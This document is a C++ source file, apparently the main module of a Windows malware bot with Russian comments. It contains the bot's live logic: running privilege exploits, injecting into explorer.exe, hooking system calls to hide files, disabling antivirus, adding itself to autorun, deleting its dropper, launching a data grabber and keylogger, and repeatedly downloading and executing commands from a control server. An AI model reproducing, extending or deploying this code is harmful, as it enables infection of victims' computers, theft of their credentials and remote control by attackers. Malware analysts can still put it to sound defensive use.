#include <windows.h>



#include "BotCore.h"
#include "DllLoader.h"

#include "Utils.h"
#include "Exploit.h"
#include "BotUtils.h"
#include "Rootkit.h"
#include "Inject.h"
#include "Unhook.h"
#include "Loader.h"
#include "Config.h"
#include "Crypt.h"
#include "FtpSniffer.h"
#include "AvBlock.h"
#include "ntdll.h"
#include "BotEvents.h"
#include "Task.h"
#include "md5.h"

#include "Modules.h"

#include "BotDebug.h"


//********************** Отладочные шаблоны **********************************

namespace MAINDBGTEMPLATES
{
	#include "DbgTemplates.h"
}

// Объявляем шаблон вывода отладочных строк
#define MDBG MAINDBGTEMPLATES::DBGOutMessage<>


//***************************************************************************


#pragma comment(linker, "/ENTRY:MyMain" )




WCHAR TempFileName[ MAX_PATH ]; //темп файл для добавления в автозагрузку
WCHAR FileToDelete[ MAX_PATH ]; //путь для удаления первоначального файла бота

DWORD dwKillPid		 = 0; //пид для убийства процесса бота
DWORD dwFirst	     = 0; //запуск в первый раз
DWORD dwAlreadyRun   = 0; //если уже запущены
DWORD dwGrabberRun	 = 0; //отработал ли граббер
DWORD dwExplorerSelf = 0; //если инжект был в собственный эксплорер
//DWORD dwExplorerPid  = 0; //пид эксплорера

//получаем пид эксплорера


void InternalAddToAutorun()
{
	// Добавляем программу в автозагрузку
	// только в случае если в системе не зарегистрирован мьютекс
	// сигнализирующий об успешной установке буткита
	#ifndef DEBUGBOT
	if (!WSTR::IsEmpty(TempFileName))
	{
		const static char ButkitMutex[] = {'b', 'k', 't', 'r', 'u', 'e',  0};
		HANDLE Mutex = (HANDLE)pOpenMutexA(SYNCHRONIZE, TRUE, (PCHAR)ButkitMutex);
		if (Mutex != NULL)
		{
				pCloseHandle(Mutex);
				MDBG("Main", "Буткит установлен. Игнорируем добавление в автозагрузку.");
				return;
		}

		MDBG("Main", "Добавляем бот в автозагрузку.");
		PCHAR Name = WSTR::ToAnsi(TempFileName, 0);
		BOT::AddToAutoRun(Name);
		STR::Free(Name);
	}
	#endif

}

void DeleteDropper() // убиваем процесс, стираем файл
{
	if ( dwKillPid != 0 && !WSTR::IsEmpty(FileToDelete))
	{
		MDBG("Main", "Удаляем дропер");
		pWinStationTerminateProcess(NULL, dwKillPid, DBG_TERMINATE_PROCESS );	
		pSetFileAttributesW( FileToDelete, FILE_ATTRIBUTE_ARCHIVE );
		pDeleteFileW(FileToDelete);
	}
}

DWORD WINAPI LoaderRoutine( LPVOID lpData )
{
	BOT::Initialize();
	
	MDBG("Main", "*************** LoaderRoutine ***************");

	UnhookDlls();
	BOT::Protect(NULL);

	// Отключаем отображение ошибок при крахе процесса
	DisableShowFatalErrorDialog();

	// Вызываем событие
	bool Cancel = false;
	SVChostStart(NULL, Cancel);
	if (Cancel)
	{
		// Убиваем процесс svchost
		pExitProcess(1);
		return 0; // для компилятора
	}

	// Стартуем поток отправки данных

	DataGrabber::StartDataSender();

	// Стартуем поток обновления списка процессов кейлогера
	#ifdef UniversalKeyLoggerH
		KeyLogger::StartProcessListDownloader();
	#endif


	bool FirstSended = false;
	
	if (InitializeTaskManager(NULL, true))
	{
		MDBG("Main", "=====>> Стартуем выполнение команд");

		PCHAR URL;
		while (true)
		{
			MDBG("Main", "=====>> Выполняем команду:");

			URL = GetBotScriptURL(SCRIPT_TASK);
			
			// Загружаем и выполняем команду
			if (URL != NULL)
			{
				MDBG("Main", URL);
				DownloadAndExecuteCommand(NULL, URL);
				STR::Free(URL);
			}
			else
				MDBG("Main", "=====>> Ошибка: Сервер не доступен!");

			// "Гениальность" проектирования взаимосвязи бота и его сервера
			// отправка стартовой информации должна идти только после получения
			// команды
			if (!FirstSended)
			{
				MDBG("Main", "=====>> Отправляем информацию о системе");
				FirstSended = SendFirstInfo();
			}

			// Приостанавливаем выполнение команд
			if (!TaskManagerSleep(NULL))
				break;
		}

    }
	return 0;
}


void ExplorerMain()
{
	MDBG("Main", "----------------- ExplorerMain -----------------");
	

	if ( !dwExplorerSelf )
		UnhookDlls();

	// Отключаем отображение ошибок при крахе процесса
	//DisableShowFatalErrorDialog();

	InternalAddToAutorun();

	DeleteDropper();

	HookZwResumeThread();
	HookZwQueryDirectoryFile();

	

	//----------------------------------------------------

	if ( !dwAlreadyRun )
		MegaJump( LoaderRoutine );
	
	#ifdef GrabberH
		if ( dwFirst && !dwGrabberRun )
			MegaJump( GrabberThread );
	#endif


	MegaJump(AvFuckThread);


	// Вызываем событие старта експлорера

	if (dwFirst)
		ExplorerFirstStart(NULL);
	ExplorerStart(NULL);

}

DWORD WINAPI ExplorerRoutine( LPVOID lpData )
{
	BOT::Initialize();


	UnhookDlls();
	
	if (dwExplorerSelf) 
	{
		//если инжект был в свой эксплорер завершаемся	

		dwExplorerSelf = 0;

		if (!InjectIntoExplorer(ExplorerRoutine))
		{
			ExplorerMain();
		}

		pExitProcess(1);
	}

	ExplorerMain();

	return 0;
}


int APIENTRY MyMain() 
{

	BOT::Initialize();


	#if defined(DEBUGBOT) && defined(DebugUtils)
		if (!StartInDebugingMode(true))
			return 0;
	#endif



	UnhookDlls(); //снимаем хуки

	WCHAR ModulePath[MAX_PATH];

	pGetModuleFileNameW( NULL, ModulePath, MAX_PATH );

	DWORD dwProcessHash = File::GetNameHashW(ModulePath, false);

	if ( dwProcessHash == BOT::GetBotExeNameHash()) // запуск из самого бота
	{
		KillOutpost();
		DWORD dwExploits = DoExploits();

		if ( !dwExploits )
		{
			if ( MegaJump( LoaderRoutine ) )
			{
				dwAlreadyRun = 1;
			}
		}

		dwExplorerSelf = 1;

		if ( !JmpToExplorer( ExplorerRoutine ) )
		{
			dwExplorerSelf = 0;

			if ( !InjectIntoExplorer( ExplorerRoutine ) && !dwAlreadyRun )
			{
				MegaJump( LoaderRoutine );
			}
		}		
	}
	else
	{
		dwFirst = 1;

		KillOutpost();
		DWORD dwExploits = DoExploits();

		if ( !dwExploits )
		{
			if (MegaJump(LoaderRoutine))
			{
				dwAlreadyRun = 1;
			}

			#ifdef GrabberH
				if ( MegaJump( GrabberThread ) )
					dwGrabberRun = 1;
			#endif 
		}
				
		m_wcsncpy(FileToDelete, ModulePath, m_wcslen( ModulePath ) );
		dwKillPid = (DWORD)pGetCurrentProcessId();
		CopyFileToTemp( ModulePath, TempFileName );	

		dwExplorerSelf = 1;

		if (!JmpToExplorer(ExplorerRoutine ) )
		{
			dwExplorerSelf = 0;

			InternalAddToAutorun();
		}
	}

	pExitProcess(1);

	return 0;
}